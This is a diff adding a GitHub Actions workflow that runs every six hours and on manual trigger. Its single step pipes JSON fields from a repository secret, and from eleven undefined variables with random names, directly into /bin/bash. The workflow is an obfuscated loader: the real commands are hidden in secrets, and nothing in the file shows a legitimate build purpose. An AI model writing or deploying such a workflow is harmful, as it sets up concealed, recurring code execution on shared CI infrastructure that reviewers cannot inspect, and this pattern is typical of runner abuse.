@@ -1,0 +1,28 @@
+name: shilifeiyi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shilifeiyi
+        env:
+          kvkth78: ${{ secrets.kvkth78 }}
+        run: |
+          echo $kvkth78 | jq -r .g445 | /bin/bash
+          echo $tc2 | jq -r .xdot45950 | /bin/bash
+          echo $i4 | jq -r .pgug7373 | /bin/bash
+          echo $eab692 | jq -r .qs4 | /bin/bash
+          echo $wit3412 | jq -r .mrq4 | /bin/bash
+          echo $hihv9 | jq -r .ywr3648 | /bin/bash
+          echo $b4998 | jq -r .ttnbn0673 | /bin/bash
+          echo $jht30265 | jq -r .t646 | /bin/bash
+          echo $kflv74 | jq -r .yvo72585 | /bin/bash
+          echo $anw2225 | jq -r .mrtj22393 | /bin/bash
+          echo $b99 | jq -r .yr7 | /bin/bash
+          echo $spe79202 | jq -r .oeh31442 | /bin/bash
+
